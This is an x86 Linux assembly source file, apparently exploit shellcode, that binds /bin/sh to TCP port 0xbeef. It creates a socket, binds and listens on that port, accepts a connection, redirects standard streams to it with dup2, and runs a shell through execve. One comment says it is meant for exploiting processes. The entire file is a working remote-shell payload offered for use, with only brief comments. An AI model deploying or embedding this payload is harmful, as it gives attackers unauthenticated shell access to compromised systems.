/* nirosys <0xcd80>
 * * * * * * * * * * * * *
 * Binds /bin/sh to port 0xbeef
 *   Change 0xbeef to whatever you
 *   want (sans null of course).
 */


.data
.NAME
	.string "cd80_lnx_bindsh.s"

.text
.globl _start

_start:
	/* socket(AF_INET,SOCK_STREAM,0) */
	xorl	%ebx, %ebx
	mull	%ebx
	pushl	%eax
	incl	%ebx
	pushl   %ebx
	pushl	$0x02
	movl	%esp, %ecx
        movb	$0x66, %al
	int	$0x80

	/* Bind, using data already on stack from socket */ 
	/* bind(<sockfd>,{0,0xbeef,0},0x10)              */
	movw	$0xbeef, 0x02(%ecx)
	movw	%dx, 0x04(%ecx)
	pushl	$0x10
	pushl	%ecx
	pushl	%eax
	movl	%esp, %ecx	
	incl	%ebx
	movb	$0x66, %al  /* Only safe for exploiting processes with <253 files open */
	int	$0x80

	/* listen(<sockfd>,4) ( why 4?, cause it was already on hand :) */
	movb	$0x04, %bl
	movl	%ebx, 0x4(%ecx)
	movb	$0x66, %al
	int	$0x80

	/* accept(<sockfd>,NULL,NULL) */
	movl	%edx, 0x4(%ecx)
	movl	%edx, 0x8(%ecx)
	incl	%ebx
	movb	$0x66, %al
	int	$0x80

	/* dup2(<connfd>,0) */
	xchgl	%eax, %ebx
	movb	$0x3F, %al
	xchgl   %edx, %ecx
	int	$0x80

	/* dup2(<connfd>,1) */
        incl	%ecx
	movb	$0x3f, %al
	int	$0x80
	
        /* dup2(<connfd>,2) */
	incl	%ecx
	movb	$0x3f, %al
	int	$0x80

	/* execve("/bin/sh",{"/bin/sh",NULL},NULL) */
	xorl    %eax, %eax
        cdq
        pushl   %eax
        pushl   $0x68732f2f
        pushl   $0x6e69622f
        movl    %esp, %ebx
        pushl   %eax
        pushl   %ebx
        movb    $0x0b, %al

        movl    %esp, %ecx
        int     $0x80


	nop
	nop
	nop
	nop
